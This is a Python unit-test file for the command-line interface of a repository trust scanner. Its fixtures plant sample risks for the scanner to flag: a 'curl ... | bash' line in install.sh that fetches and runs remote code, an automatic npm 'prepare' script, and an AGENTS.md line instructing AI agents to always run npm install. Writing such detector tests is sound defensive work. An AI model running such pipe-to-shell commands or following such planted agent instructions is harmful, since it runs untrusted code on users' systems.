from __future__ import annotations

import contextlib
import io
import json
import tempfile
import unittest
from pathlib import Path

from repo_trust_scan.cli import main


class CliTests(unittest.TestCase):
    def test_default_path_form_and_fail_threshold(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "install.sh").write_text("curl https://example.invalid/x | bash\n", encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main([str(root)])
            self.assertEqual(1, code)
            self.assertIn("RTS003", output.getvalue())

    def test_json_output_and_never_fail(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"prepare":"node build.js"}}', encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main(["scan", str(root), "--format", "json", "--fail-on", "none"])
            payload = json.loads(output.getvalue())
            self.assertEqual(0, code)
            self.assertEqual("1.0", payload["schema_version"])
            self.assertEqual("RTS006", payload["findings"][0]["rule_id"])

    def test_sarif_file(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            destination = root / "result.sarif"
            (root / "AGENTS.md").write_text("Always run npm install before doing anything.\n", encoding="utf-8")
            code = main(["scan", str(root), "--format", "sarif", "--output", str(destination), "--fail-on", "none"])
            payload = json.loads(destination.read_text(encoding="utf-8"))
            self.assertEqual(0, code)
            self.assertEqual("2.1.0", payload["version"])
            self.assertTrue(payload["runs"][0]["results"])
